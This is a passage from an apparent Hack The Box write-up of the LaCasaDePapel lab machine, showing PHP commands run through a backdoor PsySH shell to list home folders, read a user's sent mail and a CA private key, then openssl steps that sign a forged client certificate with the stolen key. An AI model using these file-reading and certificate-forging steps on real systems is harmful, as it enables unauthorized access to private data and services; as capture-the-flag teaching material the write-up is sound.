</span></span><span class="line"><span class="cl"><span class="nx">Connection</span> <span class="nx">to</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.131</span> <span class="mi">6200</span> <span class="nx">port</span> <span class="p">[</span><span class="nx">tcp</span><span class="o">/*</span><span class="p">]</span> <span class="nx">succeeded</span><span class="o">!</span>
</span></span><span class="line"><span class="cl"><span class="nx">Psy</span> <span class="nx">Shell</span> <span class="nx">v0</span><span class="o">.</span><span class="mf">9.9</span> <span class="p">(</span><span class="nx">PHP</span> <span class="mf">7.2</span><span class="o">.</span><span class="mi">10</span> <span class="nx">—</span> <span class="nx">cli</span><span class="p">)</span> <span class="nx">by</span> <span class="nx">Justin</span> <span class="nx">Hileman</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$d</span> <span class="o">=</span> <span class="nx">dir</span><span class="p">(</span><span class="s2">&#34;/home&#34;</span><span class="p">);</span> <span class="k">while</span> <span class="p">(</span><span class="k">false</span> <span class="o">!==</span> <span class="p">(</span><span class="nv">$entry</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">-&gt;</span><span class="na">read</span><span class="p">()))</span> <span class="p">{</span>  <span class="k">echo</span> <span class="nv">$entry</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="o">..</span>
</span></span><span class="line"><span class="cl"><span class="nx">oslo</span>
</span></span><span class="line"><span class="cl"><span class="nx">dali</span>
</span></span><span class="line"><span class="cl"><span class="nx">berlin</span>
</span></span><span class="line"><span class="cl"><span class="nx">nairobi</span>
</span></span><span class="line"><span class="cl"><span class="nx">professor</span></span></span></code></pre></div></p>

<p>User oslo has a very interesting folder:
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$d</span> <span class="o">=</span> <span class="nx">dir</span><span class="p">(</span><span class="s2">&#34;/home/oslo&#34;</span><span class="p">);</span> <span class="k">while</span> <span class="p">(</span><span class="k">false</span> <span class="o">!==</span> <span class="p">(</span><span class="nv">$entry</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">-&gt;</span><span class="na">read</span><span class="p">()))</span> <span class="p">{</span>  <span class="k">echo</span> <span class="nv">$entry</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="o">..</span>
</span></span><span class="line"><span class="cl"><span class="nx">Maildir</span>
</span></span><span class="line"><span class="cl"><span class="nx">inbox</span><span class="o">.</span><span class="nx">jade</span>
</span></span><span class="line"><span class="cl"><span class="nx">server</span><span class="o">.</span><span class="nx">js</span>
</span></span><span class="line"><span class="cl"><span class="nx">node_modules</span>
</span></span><span class="line"><span class="cl"><span class="k">static</span>
</span></span><span class="line"><span class="cl"><span class="nx">index</span><span class="o">.</span><span class="nx">jade</span>
</span></span><span class="line"><span class="cl"><span class="nx">package</span><span class="o">-</span><span class="nx">lock</span><span class="o">.</span><span class="nx">json</span></span></span></code></pre></div></p>

<p>Inside /home/oslo/Maildir/.Sent/cur we can find the e-mail message we are looking for:
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$d</span> <span class="o">=</span> <span class="nx">dir</span><span class="p">(</span><span class="s2">&#34;/home/oslo/Maildir/.Sent/cur&#34;</span><span class="p">);</span> <span class="k">while</span> <span class="p">(</span><span class="k">false</span> <span class="o">!==</span> <span class="p">(</span><span class="nv">$entry</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">-&gt;</span><span class="na">read</span><span class="p">()))</span> <span class="p">{</span>  <span class="k">echo</span> <span class="nv">$entry</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="o">..</span>
</span></span><span class="line"><span class="cl"><span class="mf">1564220989440.</span><span class="nx">M53839P15118V0000000000075823I00000000071958a</span><span class="o">.</span><span class="nx">lacasadepapel</span><span class="o">.</span><span class="nx">htb</span><span class="p">,</span><span class="nx">S</span><span class="o">=</span><span class="mi">430</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="nx">S</span></span></span></code></pre></div></p>

<p>Let&rsquo;s read it:
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$filepath</span> <span class="o">=</span> <span class="s2">&#34;/home/oslo/Maildir/.Sent/cur/1564220989440.M53839P15118V0000000000075823I00000000071958a.lacasadepapel.htb,S=430,2,S&#34;</span><span class="p">;</span> <span class="nv">$myfile</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">);</span> <span class="k">echo</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">,</span><span class="nx">filesize</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span> <span class="nx">text</span><span class="o">/</span><span class="nx">plain</span><span class="p">;</span> <span class="nx">format</span><span class="o">=</span><span class="nx">flowed</span>
</span></span><span class="line"><span class="cl"><span class="nx">From</span><span class="o">:</span> <span class="nx">dali</span><span class="o">@</span><span class="nx">lacasadepapel</span><span class="o">.</span><span class="nx">htb</span>
</span></span><span class="line"><span class="cl"><span class="nx">To</span><span class="o">:</span> <span class="nx">a</span><span class="o">@</span><span class="nx">a</span><span class="o">.</span><span class="nx">com</span>
</span></span><span class="line"><span class="cl"><span class="nx">Content</span><span class="o">-</span><span class="nx">Transfer</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span> <span class="mi">7</span><span class="nx">bit</span>
</span></span><span class="line"><span class="cl"><span class="nx">Date</span><span class="o">:</span> <span class="nx">Sat</span><span class="p">,</span> <span class="mi">27</span> <span class="nx">Jul</span> <span class="mi">2019</span> <span class="mi">09</span><span class="o">:</span><span class="mi">49</span><span class="o">:</span><span class="mi">49</span> <span class="o">+</span><span class="mo">0000</span>
</span></span><span class="line"><span class="cl"><span class="nx">Message</span><span class="o">-</span><span class="nx">Id</span><span class="o">:</span> <span class="o">&lt;</span><span class="mi">1564220989476</span><span class="o">-</span><span class="nx">d1c29831</span><span class="o">-</span><span class="mi">14</span><span class="nx">ba015e</span><span class="o">-</span><span class="nx">cb7a790f</span><span class="o">@</span><span class="nx">lacasadepapel</span><span class="o">.</span><span class="nx">htb</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nx">MIME</span><span class="o">-</span><span class="nx">Version</span><span class="o">:</span> <span class="mf">1.0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">Welcome</span> <span class="nx">to</span> <span class="nx">our</span> <span class="nx">community</span><span class="o">!</span>
</span></span><span class="line"><span class="cl"><span class="nx">Thanks</span> <span class="k">for</span> <span class="nx">signing</span> <span class="nx">up</span><span class="o">.</span> <span class="nx">To</span> <span class="k">continue</span><span class="p">,</span> <span class="nx">please</span> <span class="nx">verify</span> <span class="nx">your</span> <span class="nx">email</span> <span class="nx">address</span> <span class="nx">by</span> 
</span></span><span class="line"><span class="cl"><span class="nx">clicking</span> <span class="nx">the</span> <span class="nx">url</span> <span class="nx">below</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="nx">https</span><span class="o">://</span><span class="nx">lacasadepapel</span><span class="o">.</span><span class="nx">htb</span><span class="o">/</span><span class="nx">dfc318f0</span><span class="o">-</span><span class="nx">b053</span><span class="o">-</span><span class="mf">11e9</span><span class="o">-</span><span class="mi">9</span><span class="nx">ce1</span><span class="o">-</span><span class="mi">638</span><span class="nx">fd7c4c466</span></span></span></code></pre></div></p>

<p>If we visit this link (it is unique every time) <a href="https://lacasadepapel.htb/dfc318f0-b053-11e9-9ce1-638fd7c4c466" target="_blank">https://lacasadepapel.htb/dfc318f0-b053-11e9-9ce1-638fd7c4c466</a>, we are presented with a form where we submit a CSR (Certificate Signing Request) and we create a client certificate. We need this client certificate in order to access <a href="https://lacasadepapel.htb" target="_blank">https://lacasadepapel.htb</a> (this is actually the web site that is listening on 127.0.0.1:8000). There is also a link to download the CA certificate (<a href="https://lacasadepapel.htb/get-ca-authority" target="_blank">https://lacasadepapel.htb/get-ca-authority</a>). Download this CA certificate, we are gonna need it in a while. If we use the form we get a network error. Let&rsquo;s search for a different way to sign our client certificate&hellip;.</p>

<p>If we enumerate a little more we stumple upon this file:
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$filepath</span> <span class="o">=</span> <span class="s2">&#34;/home/dali/.config/psysh/tokyo.php&#34;</span><span class="p">;</span> <span class="nv">$myfile</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">);</span> <span class="k">echo</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">,</span><span class="nx">filesize</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Tokyo</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">private</span> <span class="k">function</span> <span class="nf">sign</span><span class="p">(</span><span class="nv">$caCert</span><span class="p">,</span><span class="nv">$userCsr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$caKey</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;/home/nairobi/ca.key&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$userCert</span> <span class="o">=</span> <span class="nx">openssl_csr_sign</span><span class="p">(</span><span class="nv">$userCsr</span><span class="p">,</span> <span class="nv">$caCert</span><span class="p">,</span> <span class="nv">$caKey</span><span class="p">,</span> <span class="mi">365</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;digest_alg&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;sha256&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">		<span class="nx">openssl_x509_export</span><span class="p">(</span><span class="nv">$userCert</span><span class="p">,</span> <span class="nv">$userCertOut</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nv">$userCertOut</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></p>

<p>Let&rsquo;s grab this ca.key file:
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$filepath</span> <span class="o">=</span> <span class="s2">&#34;/home/nairobi/ca.key&#34;</span><span class="p">;</span> <span class="nv">$myfile</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">);</span> <span class="k">echo</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">,</span><span class="nx">filesize</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">-----</span><span class="nx">BEGIN</span> <span class="k">PRIVATE</span> <span class="nx">KEY</span><span class="o">-----</span>
</span></span><span class="line"><span class="cl"><span class="nx">MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="mi">53</span><span class="nx">udBEzjt3WPqYGkkDknVhjD</span>
</span></span><span class="line"><span class="cl"><span class="o">-----</span><span class="nx">END</span> <span class="k">PRIVATE</span> <span class="nx">KEY</span><span class="o">-----</span></span></span></code></pre></div></p>

<p>Now we can create and sign our own client certificate. First, we generate a private key for the client:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> openssl genrsa -out client.key <span class="m">4096</span>
</span></span><span class="line"><span class="cl"><span class="go">Generating RSA private key, 4096 bit long modulus
</span></span></span><span class="line"><span class="cl"><span class="go">.............................................................................................++++
</span></span></span><span class="line"><span class="cl"><span class="go">.........................................................................++++
</span></span></span><span class="line"><span class="cl"><span class="go">e is 65537 (0x10001)
</span></span></span></code></pre></div></div></p>

<p>Then we use the client’s private key to generate a certificate request
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> openssl req -new -key client.key -out client.req
</span></span><span class="line"><span class="cl"><span class="go">You are about to be asked to enter information that will be incorporated
</span></span></span><span class="line"><span class="cl"><span class="go">into your certificate request.
</span></span></span><span class="line"><span class="cl"><span class="go">What you are about to enter is what is called a Distinguished Name or a DN.
</span></span></span><span class="line"><span class="cl"><span class="go">There are quite a few fields but you can leave some blank
</span></span></span><span class="line"><span class="cl"><span class="go">For some fields there will be a default value,
</span></span></span><span class="line"><span class="cl"><span class="go">If you enter &#39;.&#39;, the field will be left blank.
</span></span></span><span class="line"><span class="cl"><span class="go">-----
</span></span></span><span class="line"><span class="cl"><span class="go">Country Name (2 letter code) [AU]:
</span></span></span><span class="line"><span class="cl"><span class="go">State or Province Name (full name) [Some-State]:
</span></span></span><span class="line"><span class="cl"><span class="go">Locality Name (eg, city) []:
</span></span></span><span class="line"><span class="cl"><span class="go">Organization Name (eg, company) [Internet Widgits Pty Ltd]:
</span></span></span><span class="line"><span class="cl"><span class="go">Organizational Unit Name (eg, section) []:
</span></span></span><span class="line"><span class="cl"><span class="go">Common Name (e.g. server FQDN or YOUR name) []:Someone
</span></span></span><span class="line"><span class="cl"><span class="go">Email Address []:someone@somewhere.com
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Please enter the following &#39;extra&#39; attributes
</span></span></span><span class="line"><span class="cl"><span class="go">to be sent with your certificate request
</span></span></span><span class="line"><span class="cl"><span class="go">A challenge password []:
</span></span></span><span class="line"><span class="cl"><span class="go">An optional company name []:
</span></span></span></code></pre></div></div></p>

<p>Now, we sign the client certificate using the two files we downloaded (ca.crt and ca.key):
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> openssl x509 -req -in client.req -CA ca.crt -CAkey ca.key -set_serial <span class="m">101</span> -extensions client -days <span class="m">365</span> -outform PEM -out client.cer
</span></span><span class="line"><span class="cl"><span class="go">Signature ok
</span></span></span><span class="line"><span class="cl"><span class="go">subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd/CN=Someone/emailAddress=someone@somewhere.com
</span></span></span><span class="line"><span class="cl"><span class="go">Getting CA Private Key
</span></span></span></code></pre></div></div></p>

<p>Finally, we combine the client certificate and private key to a pkcs#12 file which we can import to our browser.
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12
</span></span><span class="line"><span class="cl"><span class="go">Enter Export Password: pass
</span></span></span><span class="line"><span class="cl"><span class="go">Verifying - Enter Export Password: pass
</span></span></span></code></pre></div></div></p>

<p>Let&rsquo;s visit <a href="https://lacasadepapel.htb" target="_blank">https://lacasadepapel.htb</a>. We are being asked to present a certificate to authenticate ourselves. We select the certificate we just imported to our browser and we gain access. From here on, the steps are similar to what we have already discussed for <a href="http://127.0.0.1:8000" target="_blank">http://127.0.0.1:8000</a>.</p>

        </div>

        <aside>
          <div class="p-share centered">
            <a href="https://www.buymeacoffee.com/alamot" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-coffee"></i></a>
            <a href="http://www.facebook.com/sharer.php?src=bm&u=https%3a%2f%2falamot.github.io%2flacasadepapel_writeup%2f&t=LaCasaDePapel%20%28Hack%20The%20Box%29%20write-up" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-facebook"></i></a>
            <a lang="en" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2flacasadepapel_writeup%2f&text=LaCasaDePapel%20%28Hack%20The%20Box%29%20write-up&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
            <a lang="el" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2flacasadepapel_writeup%2f&text=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20LaCasaDePapel%20%28Hack%20The%20Box%29&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
            <a lang="en" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2flacasadepapel_writeup%2f&description=LaCasaDePapel%20%28Hack%20The%20Box%29%20write-up&media=https://alamot.github.io/images/ace.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
            <a lang="el" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2flacasadepapel_writeup%2f&description=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20LaCasaDePapel%20%28Hack%20The%20Box%29&media=https://alamot.github.io/images/ace.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
          </div>
        </aside>
      </article>
      
      <section id="posts-section">
        <header lang="en"><h3>See also...</h3></header>
        <header lang="el"><h3>Δείτε επίσης...</h3></header>
        <div>
          
          
          
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Optimum (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Optimum (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">28 Oct 2017</time>
      <time lang="el">28 Οκτ 2017</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Legacy (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Legacy (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">19 Oct 2017</time>
      <time lang="el">19 Οκτ 2017</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Tally (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Tally (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">03 May 2018</time>
      <time lang="el">03 Μαϊ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Sense (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Sense (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">24 Mar 2018</time>
      <time lang="el">24 Μαρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Querier (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Querier (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">22 Jun 2019</time>
      <time lang="el">22 Ιουν 2019</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Enterprise (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Enterprise (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">19 Mar 2018</time>
      <time lang="el">19 Μαρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Nineveh (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Nineveh (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">17 Dec 2017</time>
      <time lang="el">17 Δεκ 2017</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/shutdown_manager_plain/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/shutdown_button.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Creation of a shutdown GUI using Gtk in Python</h3>
      <h3 class="title" lang="el">Δημιουργία μιας γραφικής διεπαφής κλεισίματος με τη χρήση Gtk σε Python</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">21 Jul 2016</time>
      <time lang="el">21 Ιουλ 2016</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">FluxCapacitor (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">13 May 2018</time>
      <time lang="el">13 Μαϊ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Mantis (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Mantis (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">18 Feb 2018</time>
      <time lang="el">18 Φεβ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Fulcrum (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Fulcrum (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">09 Jun 2018</time>
      <time lang="el">09 Ιουν 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Reddish (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Reddish (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">26 Jan 2019</time>
      <time lang="el">26 Ιαν 2019</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Minion (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Minion (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">10 Apr 2018</time>
      <time lang="el">10 Απρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/shutdown_manager_transparent/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/transparent_shutdown.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Creation of a transparent shutdown GUI using Gtk and Cairo in Python</h3>
      <h3 class="title" lang="el">Δημιουργία μιας διαφανούς γραφικής διεπαφής κλεισίματος με τη χρήση Gtk και Cairo σε Python</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">19 Sep 2016</time>
      <time lang="el">19 Σεπ 2016</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
